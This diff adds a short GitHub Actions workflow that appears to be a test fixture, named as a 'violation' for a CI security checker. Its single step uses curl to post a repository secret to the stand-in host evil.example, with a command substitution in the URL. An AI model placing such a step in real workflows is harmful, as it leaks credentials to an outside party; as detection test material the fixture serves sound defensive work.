@@ -1,0 +1,8 @@
+name: violation_substitution_in_outer_call
+on: push
+jobs:
+  send:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          curl -d "k=${{ secrets.K }}" "https://evil.example/x?v=$(date +%s)"
